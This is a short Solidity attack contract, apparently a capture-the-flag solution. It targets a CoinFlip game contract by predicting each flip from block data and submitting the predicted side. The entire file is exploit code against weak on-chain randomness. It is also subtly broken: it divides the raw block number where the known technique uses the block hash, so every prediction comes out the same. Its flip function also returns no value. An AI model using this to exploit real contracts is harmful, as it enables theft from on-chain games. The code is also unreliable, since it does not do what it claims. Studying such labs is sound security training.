// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Coinflip.sol";

contract Attackcoinflip {
    CoinFlip public victimcontract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContractAddress) public {
        victimcontract = CoinFlip(_victimContractAddress);
    }

    function flip() public returns (bool)
    {
        uint256 blockValue = uint256(block.number - 1);
        uint256 CoinFlip = uint256 (blockValue/FACTOR);
        bool side = CoinFlip == 1 ? true : false;

        victimcontract.flip(side);
    }
}
